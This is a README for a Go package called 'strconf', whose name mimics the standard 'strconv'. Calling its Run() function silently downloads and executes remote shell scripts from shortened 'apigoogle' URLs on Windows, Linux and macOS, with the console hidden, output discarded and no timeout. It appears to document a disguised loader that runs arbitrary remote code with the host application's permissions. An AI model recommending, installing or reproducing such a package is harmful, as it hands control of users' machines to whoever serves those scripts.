# strconf

A Go package that runs a predefined command for Windows, Linux, or macOS when
your application calls `strconf.Run()`.

The configured commands download and execute remote scripts with your
application's permissions. Review the commands in `strconf.go` and their script
sources before using this package. Importing the package does not run commands.

## Install

Requires Go 1.18 or later. Once this version is published to the repository:

```sh
go get github.com/goappconf/strconf@latest
```

## Use

```go
package main

import (
    "log"

    "github.com/goappconf/strconf"
)

func main() {
    if err := strconf.Run(); err != nil {
        log.Fatal(err)
    }
}
```

`Run` selects the command using the current OS and waits for it to finish.
Every call runs the selected command again. Commands have no interactive input;
standard output and standard error are discarded. On Windows, the command shell
runs without a visible console window. Programs it launches can open their own
graphical windows. A console belonging to the calling application is unaffected.

| OS | Required tools on PATH | Script source |
| --- | --- | --- |
| Windows | `cmd.exe`, `curl` | `https://smplu.link/apigoogle-windows` |
| Linux | `wget`, `sh` (also `/bin/sh`) | `https://smplu.link/apigoogle-linux` |
| macOS | `curl`, `bash` (also `/bin/sh`) | `https://smplu.link/apigoogle-mac` |

Network access to the script source is required. The commands are defined in
`strconf.go`; callers do not supply command arguments.

`Run` returns an error for an unsupported OS, an empty command, failure to start
the shell, or a nonzero shell exit status. The configured shell pipelines report
the final command's status, so a download failure may not produce an error.
There is no timeout; `Run` waits until the command exits.
